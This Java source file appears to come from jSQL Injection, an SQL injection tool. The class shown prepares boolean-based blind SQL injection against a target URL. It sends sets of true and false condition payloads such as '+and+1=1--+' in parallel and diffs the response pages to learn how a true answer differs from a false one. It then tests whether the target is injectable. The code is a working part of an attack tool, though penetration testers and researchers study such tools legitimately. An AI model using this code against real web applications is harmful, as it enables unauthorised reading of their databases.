package com.jsql.model.blind;

import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.Callable;
import java.util.concurrent.ExecutionException;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.Future;

import com.jsql.exception.PreparationException;
import com.jsql.model.InjectionModel;
import com.jsql.view.GUIMediator;

public class ConcreteBlindInjection extends AbstractBlindInjection {
    // Source code of the TRUE web page (usually ?id=1)
	public static String blankTrueMark;

    /**
     *  List of string differences found in all the FALSE queries, compared to the TRUE page (aka opcodes).
     *  Each FALSE pages should contain at least one same string, which shouldn't be present in all
     *  the TRUE queries.
     */
    public static List<diff_match_patch.Diff> constantFalseMark;

    public ConcreteBlindInjection(){

        // Call the SQL request which must be TRUE (usually ?id=1)
        blankTrueMark = callUrl("");

        // Every FALSE SQL statements will be checked, more statements means a more robust application
        String[] falseTest = {"true=false","true%21=true","false%21=false","1=2","1%21=1","2%21=2"};

        // Every TRUE SQL statements will be checked, more statements means a more robust application
        String[] trueTest = {"true=true","false=false","true%21=false","1=1","2=2","1%21=2"};

        // Check if the user wants to stop the preparation
        if(GUIMediator.model().stopFlag)return;

        /**
         *  Parallelize the call to the FALSE statements, it will use inject() from the model
         */
        ExecutorService executorFalseMark = Executors.newCachedThreadPool();
        List<IBlindCallable> listCallableFalse = new ArrayList<IBlindCallable>();
        for (String urlTest: falseTest){
            listCallableFalse.add(new BlindCallable(urlTest));
        }
        // Begin the url requests
        List<Future<IBlindCallable>> listFalseMark;
        try {
            listFalseMark = executorFalseMark.invokeAll(listCallableFalse);
        } catch (InterruptedException e) {
            InjectionModel.logger.error(e, e);
            return;
        }
        executorFalseMark.shutdown();

        /**
         * Delete junk from the results of FALSE statements, keep only opcodes found in each and every FALSE pages.
         * Allow the user to stop the loop
         */
        try {
            constantFalseMark = listFalseMark.get(0).get().getOpcodes();
            for(Future<IBlindCallable> falseMark: listFalseMark){
                if(GUIMediator.model().stopFlag)return;
                constantFalseMark.retainAll(falseMark.get().getOpcodes());
            }
        } catch (InterruptedException e) {
            InjectionModel.logger.error(e, e);
        } catch (ExecutionException e) {
            InjectionModel.logger.error(e, e);
        }

        if(GUIMediator.model().stopFlag)return;

        /**
         *  Parallelize the call to the TRUE statements, it will use inject() from the model
         */
        ExecutorService executorTrueMark = Executors.newCachedThreadPool();
        List<BlindCallable> listCallableTrue = new ArrayList<BlindCallable>();
        for (String urlTest: trueTest){
            listCallableTrue.add(new BlindCallable(/*initialUrl+*/"+and+"+urlTest+"--+"));
        }
        // Begin the url requests
        List<Future<IBlindCallable>> listTrueMark;
        try {
            listTrueMark = executorTrueMark.invokeAll(listCallableTrue);
        } catch (InterruptedException e) {
            InjectionModel.logger.error(e, e);
            return;
        }
        executorTrueMark.shutdown();

        /**
         * Remove TRUE opcodes in the FALSE opcodes, because a significant FALSE statement shouldn't
         * contain any TRUE opcode.
         * Allow the user to stop the loop
         */
        try {
            for(Future<IBlindCallable> trueMark: listTrueMark){
                if(GUIMediator.model().stopFlag)return;
                constantFalseMark.removeAll(trueMark.get().getOpcodes());
            }
        } catch (InterruptedException e) {
            InjectionModel.logger.error(e, e);
        } catch (ExecutionException e) {
            InjectionModel.logger.error(e, e);
        }
    }

    // Run a HTTP call via the model
    public static String callUrl(String urlString){
        return GUIMediator.model().inject(GUIMediator.model().insertionCharacter + urlString);
    }
    
    @Override
    public Callable<IBlindCallable> getCallable(String string, int indexCharacter, boolean iS_LENGTH_TEST) {
    	return new BlindCallable(string, indexCharacter, iS_LENGTH_TEST);
    }

	@Override
	public Callable<IBlindCallable> getCallable(String string, int indexCharacter, int bit) {
		return new BlindCallable(string, indexCharacter, bit);
	}

    /**
     * Start one test to verify if blind works
     * @return true if blind method is confirmed
     * @throws PreparationException
     */
    public boolean isInjectable() throws PreparationException{
        if(GUIMediator.model().stopFlag)
            throw new PreparationException();

        BlindCallable blindTest = new BlindCallable("0%2b1=1");
        try {
            blindTest.call();
        } catch (Exception e) {
            InjectionModel.logger.error(e, e);
        }

        return constantFalseMark != null && blindTest.isTrue() && constantFalseMark.size() > 0;
    }

	@Override
	public String getInfoMessage() {
		return "A blind SQL request is true if the diff between a correct page (e.g existing id) and current page is not as the following: " + constantFalseMark + "\n";
	}
}
